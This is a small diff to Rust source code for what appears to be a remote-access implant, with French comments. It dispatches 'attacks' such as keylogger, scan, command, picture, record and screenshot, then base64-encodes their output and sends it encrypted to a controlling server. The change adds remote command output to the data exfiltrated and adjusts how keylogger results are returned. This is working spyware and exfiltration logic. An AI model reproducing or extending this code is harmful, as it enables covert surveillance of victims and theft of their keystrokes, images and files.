@@ -352,7 +352,7 @@ fn execute_attack(
     // println!("{:?}", Command::new(&executable_path).args(&args));
     let output = Command::new(&executable_path).args(&args).output()?;
     
-
+    // println!("{:?}", output);
     // Check if the command was successful
     if output.status.success() {
         // Convert stdout to a string
@@ -522,14 +522,14 @@ fn main() -> io::Result<()> {
 
 
                             // si l'attaque nécessite d'envoyer de la donnée à garder
-                            }else if type_attack == "keylogger" || type_attack == "scan"{
+                            }else if type_attack == "keylogger" || type_attack == "scan" || type_attack == "command"{
                                 let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"{}\"}}", id_attack, type_attack, BASE64_STANDARD.encode(output.as_bytes()));
                                 // println!("{:?}", response);
                                 send_encrypted_string_to_server(&stream_clone, response, symetric_key.clone(), iv.clone());
                                 
 
                             // si l'attaque nécessite d'envoyer un fichier
-                            }else if type_attack == "picture" || type_attack == "record" || type_attack == "keylogger" || type_attack == "screenshot"{
+                            }else if type_attack == "picture" || type_attack == "record" || type_attack == "screenshot"{
                                 // lecture du fichier
                                 // println!("{:?}", output);
                                 let file_path = output.replace("\n", "");
